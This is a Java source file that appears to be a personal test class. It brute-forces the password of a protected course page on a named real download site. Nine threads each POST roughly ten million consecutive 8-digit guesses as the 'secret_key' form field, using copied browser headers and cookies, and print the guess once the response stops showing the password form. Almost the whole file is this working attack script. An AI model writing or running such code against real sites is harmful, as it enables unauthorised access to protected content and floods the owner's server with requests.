package com.yida.bilibili.test;

import com.yida.bilibili.utils.OkHttpClientUtils;
import okhttp3.Response;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.LinkedBlockingDeque;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * @author yida
 * @package com.yida.bilibili.test
 * @date 2023-02-08 10:17
 * @description Type your description over here.
 */
public class Download52Test {
	public static final String request_url = "http://www.52download.cn/wpcourse/?p=28618";
	public static final String pwd_form_field = "secret_key";
	public static final String submit_form_field = "Submit";

	public static final Map<String, String> header_map = new HashMap<>();

	static {
		header_map.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
		header_map.put("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
		header_map.put("Cache-Control", "max-age=0");
		header_map.put("Connection", "keep-alive");
		header_map.put("Content-Length", "45");
		header_map.put("Content-Type", "application/x-www-form-urlencoded");
		header_map.put("Cookie", "Hm_lvt_43ba7520f0ab5a07ccd6341606521653=1675820969; Hm_lpvt_43ba7520f0ab5a07ccd6341606521653=1675821527");
		header_map.put("Host", "www.52download.cn");
		header_map.put("Origin", "http://www.52download.cn");
		header_map.put("Referer", "http://www.52download.cn/wpcourse/?p=28618");
		header_map.put("Upgrade-Insecure-Requests", "1");
		header_map.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
	}



	public static final ExecutorService executorService = new ThreadPoolExecutor(2, 4, 5, TimeUnit.SECONDS,new LinkedBlockingDeque<Runnable>(10000000)) ;

	public static void main(String[] args) throws IOException {
		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 10002090;
				int end = 20000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();



		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 20000600;
				int end = 30000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();



		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 30000600;
				int end = 40000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();





		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 40000600;
				int end = 50000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();


		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 50000600;
				int end = 60000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();



		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 60000600;
				int end = 70000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();



		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 70000600;
				int end = 80000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();



		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 80000600;
				int end = 90000000;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();




		new Thread(new Runnable() {
			@Override
			public void run() {
				int start = 90000600;
				int end = 99999999;
				for (int i = start; i <= end; i++) {
					//executorService.execute(new ExRunnable(i));

					Map<String, String> param_map = new HashMap<>();
					param_map.put(pwd_form_field, i + "");
					param_map.put(submit_form_field, "提交");
					Response response = OkHttpClientUtils.post(request_url, header_map, param_map);
					String content = null;
					try {
						content = response.body().string();
					} catch (IOException e) {
						e.printStackTrace();
					}
					if(!content.contains("secret_key")) {
						System.out.println("---------------------------------->>密码为：" + i);
					} else {
						System.out.println("[" + i + "] has been passed.");
					}
				}
			}
		}).start();
	}

}
